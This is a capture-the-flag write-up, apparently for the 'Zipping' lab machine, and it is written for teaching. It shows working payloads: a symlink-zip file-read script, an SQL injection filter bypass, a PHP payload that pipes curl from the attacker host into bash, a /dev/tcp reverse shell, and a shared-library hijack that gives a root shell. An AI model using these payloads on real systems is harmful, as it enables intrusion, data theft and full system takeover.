
we start the machine as always with a port scan:
	
	rustscan -a 10.10.11.229
output:
	
	22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
	|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
	80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
	|_http-title: Zipping | Watch store
	|_http-server-header: Apache/2.4.54 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

we only got 2 ports open so we can tackle the web server running on port 80.
but before that the machine is named _Zipping_ so bettert add those 2 records on /etc/hosts:
	
	echo '10.10.11.229	zipping	  zipping.htb' >> /etc/hosts
now we can visit the webserver in _http://zipping.htb/_
the site has 2 interesting parts:
1) Shop of items in http://10.10.11.229/shop/index.php?page=product&id=4
where we can see the query paramether that indicates the page and product;
maybe some LFI or SQLI... but i tried some payloads and doesn't work.
2) In the second part of the site there is an upload Form in http://10.10.11.229/upload.php where we can submit a zip file...
interesting, is ineherent with the name of the machine so i take a shoot and i will 
concentrate my effort here for now.

I start by uploading a simple non-pdf file but i got this error:
	
	The unzipped file must have a .pdf extension.
so i create a pdf file and zip it and i got this:
	
	uploads/2967cde7869fc5cbab5280e68bd77603/prova.pdf
so the file get uploaded in a directory with a hash and the name of the file pdf inside the zip folder.
I tried to check that hash and in fact it is the hash of the file zip so we can predict where the file will
be uploaded to.
so i start checking for zip exploit and found this:
	
	https://book.hacktricks.xyz/pentesting-web/file-upload
where i see a bunch of exploits and one looks intersting:
	
	ln -s ../../../index.php symindex.txt
	zip --symlinks test.zip symindex.txt 
this is an LFI (local file inclusion) that use symlinks so when the zip folder get unzipped the link
of the extracted file keep pointing to the link.
so for example if i create this file:
	
	ln -s /etc/passwd file.pdf
	zip --symlinks test.zip file.pdf
and upload on the server i will see its /etc/passwd
i like to automate stuff so i've written this python code to se the file i want:
	
```python3	
#!/bin/env python3

import os
import requests
import sys
import subprocess
from time import sleep

url = "http://zipping.htb/"

os.system(f"rm test.zip")
os.system(f"rm file.pdf")

path = input("inserisci la path da leggere: ")
filename = 'file.pdf'

os.system(f"ln -s {path} {filename}")
os.system(f"zip --symlinks test.zip {filename}")

#creo l'oggetto file da inviare
files = {"zipFile": ('test.zip', open('test.zip', 'rb'), 'application/zip')}
#invio la richiesta post all'endpoint
os.system('curl -s http://zipping.htb/upload.php -F "zipFile=@./test.zip;type=application/zip" -F "submit=Submit" > /dev/null 2>&1')

print("[*]File uploaded\n")
#prendo l'hash md5 del file
file_md5sum = subprocess.check_output("md5sum test.zip", shell=True, text=True)[:32]
#get the file from the server
os.system(f'curl "{url}uploads/{file_md5sum}/{filename}"')

print("\n[*]Exploit by Disturbante")
```
this code create the sym link with the path u write, create a zip folder, compute the md5 of the folder,
upload the file and visit the url created.

with the LFI i got the user of the webserver:
	
	[REDACTED]:x:1001:1001::/home/[REDACTED]:/bin/bash
now that i know the name of the user i can also get the user flag in with my script in 2 clicks:
	
	/home/[REDACTED]/user.txt
we need an rce to continue...

So with the LFI i started to download some webserver files like the one where there is the
product query paramether.
in fact in path:
	
	/var/www/html/shop/product.php
i read a very interesting line:
	
	$id = $_GET['id'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
        header('Location: index.php');
    } else {
        // Prepare statement and execute, but does not prevent SQL injection
        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
        $stmt->execute();
this code here filter the id GET paramether with a regex:
if the id start and end with a number and doesn't contanin anything else the query get executed.
So to get an sqli we need to bypass this preg_match, to do so i found this:
	
	https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp
in this snippet the preg_match doesn't see the \n (%0a) character and go trought:
	
	$myinput="aaaaaaa
	11111111"; //Notice the new line
	echo preg_match("/1/",$myinput);
	//1  --> In this scenario preg_match find the char "1"
	echo preg_match("/1.*$/",$myinput);
	//1  --> In this scenario preg_match find the char "1"
	echo preg_match("/^.*1/",$myinput);
	//0  --> In this scenario preg_match DOESN'T find the char "1"
	echo preg_match("/^.*1.*$/",$myinput);
	//0  --> In this scenario preg_match DOESN'T find the char "1"
so we need to craft our payload like this:
	
	http://10.10.11.229/shop/index.php?page=product&id=%0a OR 1=1
after URL encode:
	
	http://10.10.11.229/shop/index.php?page=product&id=%0a%20OR%201=1
output:
	
	Product does not exist!

so we can execute sql code!!
so now we need to get RCE and i can try to do it via sql file write:
	
	\';select \'<?php system(\"curl http://10.10.14.238/shell.sh|bash\");?>\' into outfile \'/var/lib/mysql/file.php\' #1
so we need to create a shell.sh on our local machine and start a web server:
	
	echo '/bin/bash -i >& /dev/tcp/10.10.14.238/4444 0>&1' > shell.sh
	python3 -m http.server 80
now when we go here:
	
	curl -s $'http://zipping.htb/shop/index.php?page=product&id=%0A\'%3bselect+\'<%3fphp+system(\"curl+http%3a//10.10.14.238/shell.sh|bash\")%3b%3f>\'+into+outfile+\'/var/lib/mysql/file.php\'+%231'
the file get uploaded in _/var/lib/mysql/file.php_
so now we need to visit the file.php in order to activate the revshell, we can use the other
LFI on the server: 
	
	python3 -m pwncat -lp 4444
	curl -s $'http://zipping.htb/shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2ffile'
So now we are in as the user!!

We need to enumerate and escalate.
when i run:
	
	sudo -l
output:
	
	User [REDACTED] may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
so we apperently can run this binary as root
so i downloaded and explored in ghidra:
	
	(on pwncat terminal)
	Ctrl + D
	downlaod /usr/bin/stock htb/zipping/stock
now we can analyze the binary.
it is a software for stock management but it is protected by a password in this function:

	iVar1 = checkAuth(local_b8);
	if (iVar1 == 0) {
	    puts("Invalid password, please try again.");
	    uVar2 = 1;
	}
	iVar1 = strcmp(param_1,"[REDACTED]");
  	return iVar1 == 0;
we now have the password we now need to undestand what is doing on with the rest of the code, like some external library loading and stuff like that.
so i launched the _strace_ command on the machine to see the actual 'backend' of the binary as it is executing.
		
	strace /usr/bin/stock
output:
		
	write(1, "Enter the password: ", 20Enter the password: )    = 20
	read(0, 
the programm is basically waiting for the password but from the disassemble of the code we found it and we can go on:
		
	"[REDACTED]\n", 1024)         = 13
	openat(AT_FDCWD, "/home/[REDACTED]/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
the binary is now searching a library called libcounter.so that isn't found so maybe we can inject this library, also the path is inside our home directory
so let's begin the hijacking.
I first googled how to create a .so (shared library object)
and here chatgpt came to our aid:
		
	gcc -shared -o libcounter.so -fPIC libcounter.c
with this command we can create a shared library object,
but before this we need to create the libcounter.c file:

	//libcounter.c	
	#include <stdio.h>
	#include <stdlib.h>

	__attribute__((constructor))
	int main(){
		system("bash -p");
		return 0;
	}
so now we can compile the library with the command above and copy the created library to the path that the binary calls:
		
	cp libcounter.so /home/[REDACTED]/.config/
now everything is ready and we can execute the script with sudo, insert the password and we are root!!
		
	root@zipping:/root# echo pwned





